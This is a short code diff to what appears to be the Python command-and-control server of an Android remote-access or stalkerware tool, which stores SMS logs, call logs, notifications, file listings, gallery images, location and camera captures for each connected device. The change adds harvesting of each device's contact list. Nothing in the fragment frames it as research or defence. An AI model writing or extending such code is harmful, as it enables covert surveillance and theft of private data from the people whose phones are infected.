@@ -27,7 +27,7 @@ def add_log(msg):
 
 def create_client_data():
     return {
-        "sms": [], "calls": [], "apps": [], "notifications": [],
+        "sms": [], "calls": [], "apps": [], "notifications": [], "contacts": [],
         "fm": {"path": "/", "files": []}, "gallery": {"page": 0, "files": []},
         "info": {}, "location": {"url": None, "img": None, "status": "idle"},
         "media": {"last_img": None, "last_vid": None, "status": "idle"},
@@ -45,6 +45,7 @@ def handle_tcp_data(raw_line, cid):
             if t == 'DEVICE_INFO': cd['info'].update(packet.get('info', {}))
             elif t == 'SMS_LOG': cd['sms'] = packet.get('logs', [])
             elif t == 'CALL_LOG': cd['calls'] = packet.get('logs', [])
+            elif t == 'CONTACT_LIST': cd['contacts'] = packet.get('contacts', [])
             elif t == 'APP_LIST': cd['apps'] = packet.get('apps', [])
             elif t == 'NOTIFICATION_DATA': cd['notifications'].insert(0, packet.get('notification', {}))
             elif t == 'FILE_MANAGER_RESULT': cd['fm'].update(packet.get('listing', {}))
